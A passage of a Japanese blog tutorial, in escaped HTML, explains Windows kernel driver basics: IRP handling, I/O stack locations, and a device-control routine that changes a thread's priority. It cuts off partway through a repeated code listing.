&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/24426875/what-is-use-decl-annotations-meaning&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;c++ - what is &lt;em&gt;Use&lt;/em&gt;decl&lt;em&gt;annotations&lt;/em&gt; meaning - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/cpp/code-quality/annotating-function-behavior?view=msvc-170&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Annotating function behavior | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;しばらく調べたものの用途がわからなかったので、わかったら追記しようかと思います。&lt;/p&gt;
&lt;h3 id=&quot;irpの受け取り&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#irp%E3%81%AE%E5%8F%97%E3%81%91%E5%8F%96%E3%82%8A&quot; aria-label=&quot;irpの受け取り permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;IRPの受け取り&lt;/h3&gt;
&lt;p&gt;IRPはアプリケーションからI/O要求が発生した場合に、I/Oマネージャによって作成される構造体です。&lt;/p&gt;
&lt;p&gt;IRPは非ページプールに割り当てされ、データのパケットとして受け渡されます。&lt;/p&gt;
&lt;p&gt;先にコードを見てみます。&lt;/p&gt;
&lt;p&gt;4章のドライバで行っていることはシンプルで、引数として受け取ったIRPの&lt;code class=&quot;language-text&quot;&gt;IoStatus&lt;/code&gt;の値を何やら書き換えた後、&lt;code class=&quot;language-text&quot;&gt;IoCompleteRequest&lt;/code&gt;に引き渡しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;Irp&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;IoStatus&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_SUCCESS&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
Irp&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;IoStatus&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Information &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;IoCompleteRequest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Irp&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; IO_NO_INCREMENT&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;IRPは大きくIRPヘッダとスタックロケーションで構成されています。&lt;/p&gt;
&lt;p&gt;アプリケーションからの要求をI/Oマネージャが受け取った後、IRPを非ページプールメモリに割り当てます。&lt;/p&gt;
&lt;p&gt;その後、IRPヘッダとスタックロケーションを初期化してドライバのディスパッチルーチンを呼び出します。&lt;/p&gt;
&lt;p&gt;詳細な流れについては以下の記事が非常に参考になりました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sciencepark.co.jp/device_driver/dvdr/report-25/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;デバドラ講座25 │ サイエンスパーク株式会社&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;IoStatus&lt;/code&gt;はI/Oステータスブロックで、IRPが完了するとその完了状態が&lt;code class=&quot;language-text&quot;&gt;IoStatus.Status&lt;/code&gt;に設定されます。&lt;/p&gt;
&lt;p&gt;また&lt;code class=&quot;language-text&quot;&gt;IoStatus.Information&lt;/code&gt;には読み書きされたバイト長が保持されます。&lt;/p&gt;
&lt;p&gt;ここでは何も読み書きをしていないので、&lt;code class=&quot;language-text&quot;&gt;IoStatus.Information&lt;/code&gt;は0を代入しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;IoCompleteRequest&lt;/code&gt;マクロは、ディスパッチルーチンがI/O要求の処理をすべて完了し、IRPをI/Oマネージャに返却するためのマクロです。&lt;/p&gt;
&lt;p&gt;これでCREATEとCLOSEに対してサポートするディスパッチルーチンの定義は完了しました。&lt;/p&gt;
&lt;h3 id=&quot;デバイスコントロールのセットアップ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97&quot; aria-label=&quot;デバイスコントロールのセットアップ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;デバイスコントロールのセットアップ&lt;/h3&gt;
&lt;p&gt;次に、&lt;code class=&quot;language-text&quot;&gt;DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = SecondDriverDeviceControl;&lt;/code&gt;の行で設定しているデバイスコントロールルーチンのセットアップを行います。&lt;/p&gt;
&lt;p&gt;DEVICE_CONTROLは、ドライバとデータを受け渡す際に汎用的に使用可能なルーチンです。&lt;/p&gt;
&lt;p&gt;DEVICE_CONTROLは入力バッファ、出力バッファ、制御コードの3つを受け取る必要があります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;IRP&lt;em&gt;MJ&lt;/em&gt;DEVICE_CONTROL - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-i-o-control-codes&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Introduction to I/O Control Codes - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;DEVICE_CONTROLには、以下のドキュメントに記載されている制御コードが渡され、操作が決定されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;DeviceIoControl function (ioapiset.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;実際にコードを見てみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;_Use_decl_annotations_
NTSTATUS &lt;span class=&quot;token function&quot;&gt;SecondDriverDeviceControl&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PDEVICE_OBJECT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PIRP Irp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token comment&quot;&gt;// get our IO_STACK_LOCATION&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;auto&lt;/span&gt; stack &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;IoGetCurrentIrpStackLocation&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Irp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;auto&lt;/span&gt; status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_SUCCESS&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;stack&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Parameters&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DeviceIoControl&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;IoControlCode&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; IOCTL_SECOND_DRIVER_SET_PRIORITY&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;token comment&quot;&gt;// do the work&lt;/span&gt;
		&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;stack&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Parameters&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DeviceIoControl&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;InputBufferLength &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ThreadData&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
			status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_BUFFER_TOO_SMALL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;token keyword&quot;&gt;auto&lt;/span&gt; data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ThreadData&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;stack&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Parameters&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DeviceIoControl&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Type3InputBuffer&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; nullptr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
			status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_INVALID_PARAMETER&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Priority &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Priority &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
			status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_INVALID_PARAMETER&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

		PETHREAD Thread&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;PsLookupThreadByThreadId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;ULongToHandle&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;ThreadId&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;Thread&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;NT_SUCCESS&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;status&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;token function&quot;&gt;KeSetPriorityThread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PKTHREAD&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;Thread&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Priority&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token function&quot;&gt;ObDereferenceObject&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Thread&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token function&quot;&gt;KdPrint&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Thread Priority change for %d to %d succeeded!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
			data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;ThreadId&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Priority&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
		status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_INVALID_DEVICE_REQUEST&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

	Irp&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;IoStatus&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; status&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	Irp&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;IoStatus&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Information &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;IoCompleteRequest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Irp&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; IO_NO_INCREMENT&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; status&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;現在のスタックロケーションの取得&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E7%8F%BE%E5%9C%A8%E3%81%AE%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%AD%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%8F%96%E5%BE%97&quot; aria-label=&quot;現在のスタックロケーションの取得 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;現在のスタックロケーションの取得&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;IoGetCurrentIrpStackLocation&lt;/code&gt;関数は、現在のスタックロケーションを取得できます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;auto&lt;/span&gt; stack &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;IoGetCurrentIrpStackLocation&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Irp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;スタックロケーションは&lt;code class=&quot;language-text&quot;&gt;IO_STACK_LOCATION&lt;/code&gt;構造体で定義されています。&lt;/p&gt;
&lt;p&gt;ドライバはIRP内のスタックロケーションを利用してI/O操作に関するドライバ固有の情報を取得します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iogetcurrentirpstacklocation&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;IoGetCurrentIrpStackLocation function (wdm.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;スタックロケーションには以下のような情報が含まれます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ドライバが実行するMajorFunctionsの情報&lt;/li&gt;
&lt;li&gt;ドライバが実行するMinorFunctionsの情報&lt;/li&gt;
&lt;li&gt;ドライバが転送するデータのバッファの長さや開始位置など&lt;/li&gt;
&lt;li&gt;ドライバーが作成したデバイスオブジェクトへのポインタ&lt;/li&gt;
&lt;li&gt;開いているファイル、デバイス、ディレクトリ、またはボリュームを表すファイルオブジェクトへのポインタ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/i-o-stack-locations&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;I/O Stack Locations - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;要求された優先順位をスレッドに設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%A6%81%E6%B1%82%E3%81%95%E3%82%8C%E3%81%9F%E5%84%AA%E5%85%88%E9%A0%86%E4%BD%8D%E3%82%92%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E3%81%AB%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;要求された優先順位をスレッドに設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;要求された優先順位をスレッドに設定する&lt;/h3&gt;
&lt;p&gt;ここが今回作成するドライバの核になる実装です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;SecondDriverDeviceControl&lt;/code&gt;関数内で定義しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;IoGetCurrentIrpStackLocation&lt;/code&gt;関数で取得したスタックロケーションには、受け渡された制御コードなどの情報が含まれます。&lt;/p&gt;
&lt;p&gt;そのため、&lt;code class=&quot;language-text&quot;&gt;stack-&gt;Parameters.DeviceIoControl.IoControlCode&lt;/code&gt;内の情報を元に処理を分岐させています。&lt;/p&gt;
&lt;p&gt;ソースコードは以下です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// switch (stack-&gt;Parameters.DeviceIoControl.IoControlCode)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; IOCTL_SECOND_DRIVER_SET_PRIORITY&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token comment&quot;&gt;// do the work&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;stack&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Parameters&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DeviceIoControl&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;InputBufferLength &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ThreadData&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_BUFFER_TOO_SMALL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;token keyword&quot;&gt;auto&lt;/span&gt; data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ThreadData&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;stack&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Parameters&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DeviceIoControl&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Type3InputBuffer&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; nullptr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_INVALID_PARAMETER&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

